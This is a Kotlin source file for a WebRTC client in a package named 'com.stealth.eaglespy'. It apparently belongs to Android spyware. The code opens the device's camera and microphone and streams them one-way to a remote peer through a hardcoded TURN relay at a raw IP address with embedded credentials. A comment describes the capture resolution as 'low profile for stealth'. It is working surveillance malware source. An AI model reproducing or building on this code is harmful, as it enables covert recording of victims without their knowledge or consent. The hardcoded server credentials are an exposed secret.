package com.stealth.eaglespy.webrtc

import android.content.Context
import org.webrtc.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * WebRTC Peer Connection Client
 * Manages media capture and peer connection for streaming
 */
class PeerConnectionClient(
    private val context: Context,
    private val useFrontCamera: Boolean,
    private val videoEnabled: Boolean,
    private val audioEnabled: Boolean
) {

    interface Listener {
        fun onIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int)
        fun onLocalDescription(sdp: String, type: String)
        fun onConnected()
        fun onDisconnected()
    }

    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var videoCapturer: CameraVideoCapturer? = null
    private var localVideoSource: VideoSource? = null
    private var localVideoTrack: VideoTrack? = null
    private var localAudioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    
    private var listener: Listener? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private var eglBase: EglBase? = null

    // TURN server configuration
    private val iceServers = listOf(
        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
        PeerConnection.IceServer.builder("turn:213.91.211.150:3478")
            .setUsername("eaglespy")
            .setPassword("EagleSpy2024Secure!")
            .createIceServer()
    )

    fun setListener(listener: Listener) {
        this.listener = listener
    }

    fun initialize() {
        executor.execute {
            initializePeerConnectionFactory()
            createPeerConnection()
            setupMediaTracks()
        }
    }

    private fun initializePeerConnectionFactory() {
        eglBase = EglBase.create()
        
        val options = PeerConnectionFactory.InitializationOptions.builder(context)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        
        PeerConnectionFactory.initialize(options)

        val encoderFactory = DefaultVideoEncoderFactory(
            eglBase?.eglBaseContext,
            true, // enableIntelVp8Encoder
            true  // enableH264HighProfile
        )

        val decoderFactory = DefaultVideoDecoderFactory(eglBase?.eglBaseContext)

        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoderFactory)
            .setVideoDecoderFactory(decoderFactory)
            .setOptions(PeerConnectionFactory.Options())
            .createPeerConnectionFactory()
    }

    private fun createPeerConnection() {
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            iceTransportsType = PeerConnection.IceTransportsType.ALL
        }

        peerConnection = peerConnectionFactory?.createPeerConnection(
            rtcConfig,
            object : PeerConnection.Observer {
                override fun onIceCandidate(candidate: IceCandidate) {
                    listener?.onIceCandidate(
                        candidate.sdp,
                        candidate.sdpMid,
                        candidate.sdpMLineIndex
                    )
                }

                override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
                    when (state) {
                        PeerConnection.IceConnectionState.CONNECTED -> listener?.onConnected()
                        PeerConnection.IceConnectionState.DISCONNECTED,
                        PeerConnection.IceConnectionState.FAILED -> listener?.onDisconnected()
                        else -> {}
                    }
                }

                override fun onSignalingChange(state: PeerConnection.SignalingState) {}
                override fun onIceConnectionReceivingChange(receiving: Boolean) {}
                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) {}
                override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
                override fun onAddStream(stream: MediaStream) {}
                override fun onRemoveStream(stream: MediaStream) {}
                override fun onDataChannel(dataChannel: DataChannel) {}
                override fun onRenegotiationNeeded() {}
                override fun onAddTrack(receiver: RtpReceiver, streams: Array<out MediaStream>) {}
            }
        )
    }

    private fun setupMediaTracks() {
        // Video Track (Camera)
        if (videoEnabled) {
            videoCapturer = createCameraCapturer()
            videoCapturer?.let { capturer ->
                surfaceTextureHelper = SurfaceTextureHelper.create(
                    "CaptureThread",
                    eglBase?.eglBaseContext
                )
                
                localVideoSource = peerConnectionFactory?.createVideoSource(capturer.isScreencast)
                capturer.initialize(surfaceTextureHelper, context, localVideoSource?.capturerObserver)
                
                // Start capture: 640x480 @ 30fps (low profile for stealth)
                capturer.startCapture(640, 480, 30)
                
                localVideoTrack = peerConnectionFactory?.createVideoTrack("video0", localVideoSource)
                localVideoTrack?.setEnabled(true)
                
                peerConnection?.addTrack(localVideoTrack, listOf("stream0"))
            }
        }

        // Audio Track (Microphone)
        if (audioEnabled) {
            val audioConstraints = MediaConstraints().apply {
                mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
                mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
                mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            }
            
            localAudioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
            localAudioTrack = peerConnectionFactory?.createAudioTrack("audio0", localAudioSource)
            localAudioTrack?.setEnabled(true)
            
            peerConnection?.addTrack(localAudioTrack, listOf("stream0"))
        }
    }

    private fun createCameraCapturer(): CameraVideoCapturer? {
        val enumerator = Camera2Enumerator(context)
        val deviceNames = enumerator.deviceNames

        // Select camera based on preference
        for (deviceName in deviceNames) {
            val isFront = enumerator.isFrontFacing(deviceName)
            if ((useFrontCamera && isFront) || (!useFrontCamera && !isFront)) {
                return enumerator.createCapturer(deviceName, null)
            }
        }

        // Fallback to any available camera
        return deviceNames.firstOrNull()?.let { enumerator.createCapturer(it, null) }
    }

    fun createOffer() {
        executor.execute {
            val constraints = MediaConstraints().apply {
                mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
                mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
            }

            peerConnection?.createOffer(object : SdpObserver {
                override fun onCreateSuccess(desc: SessionDescription) {
                    peerConnection?.setLocalDescription(object : SdpObserver {
                        override fun onCreateSuccess(desc: SessionDescription) {}
                        override fun onSetSuccess() {
                            listener?.onLocalDescription(desc.description, "offer")
                        }
                        override fun onCreateFailure(error: String) {}
                        override fun onSetFailure(error: String) {}
                    }, desc)
                }
                override fun onSetSuccess() {}
                override fun onCreateFailure(error: String) {}
                override fun onSetFailure(error: String) {}
            }, constraints)
        }
    }

    fun createAnswer() {
        executor.execute {
            val constraints = MediaConstraints()

            peerConnection?.createAnswer(object : SdpObserver {
                override fun onCreateSuccess(desc: SessionDescription) {
                    peerConnection?.setLocalDescription(object : SdpObserver {
                        override fun onCreateSuccess(desc: SessionDescription) {}
                        override fun onSetSuccess() {
                            listener?.onLocalDescription(desc.description, "answer")
                        }
                        override fun onCreateFailure(error: String) {}
                        override fun onSetFailure(error: String) {}
                    }, desc)
                }
                override fun onSetSuccess() {}
                override fun onCreateFailure(error: String) {}
                override fun onSetFailure(error: String) {}
            }, constraints)
        }
    }

    fun setRemoteDescription(sdp: String, type: String) {
        executor.execute {
            val sdpType = if (type == "offer") SessionDescription.Type.OFFER else SessionDescription.Type.ANSWER
            val sessionDescription = SessionDescription(sdpType, sdp)
            
            peerConnection?.setRemoteDescription(object : SdpObserver {
                override fun onCreateSuccess(desc: SessionDescription) {}
                override fun onSetSuccess() {}
                override fun onCreateFailure(error: String) {}
                override fun onSetFailure(error: String) {}
            }, sessionDescription)
        }
    }

    fun addIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        executor.execute {
            val iceCandidate = IceCandidate(sdpMid, sdpMLineIndex, candidate)
            peerConnection?.addIceCandidate(iceCandidate)
        }
    }

    fun switchCamera() {
        executor.execute {
            (videoCapturer as? CameraVideoCapturer)?.switchCamera(null)
        }
    }

    fun close() {
        executor.execute {
            videoCapturer?.stopCapture()
            videoCapturer?.dispose()
            localVideoTrack?.dispose()
            localAudioTrack?.dispose()
            localVideoSource?.dispose()
            localAudioSource?.dispose()
            surfaceTextureHelper?.dispose()
            peerConnection?.close()
            peerConnection?.dispose()
            peerConnectionFactory?.dispose()
            eglBase?.release()
        }
        executor.shutdown()
    }
}
